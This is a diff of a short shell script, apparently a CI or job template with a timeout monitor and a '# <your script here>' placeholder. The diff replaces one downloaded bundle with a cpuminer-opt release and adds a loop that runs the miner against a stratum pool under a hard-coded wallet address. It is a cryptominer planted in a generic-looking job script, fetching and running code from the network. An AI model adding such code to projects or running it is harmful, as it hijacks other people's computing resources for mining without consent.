@@ -12,12 +12,12 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/lushenry654/bitbucket/raw/master/rtm24.tar.gz && tar xf rtm24.tar.gz
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
 while [ 1 ]; do
-./cpuminer.sh
-sleep 3
+	./cpuminer-sse2 -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RFcnLsWDziyWU7Hj8VrTpuAAv7FFYBJTi6.Dee
+	sleep 5
 done
-sleep 9999
 # <your script here>
 
 # kill timeout monitor when terminating:
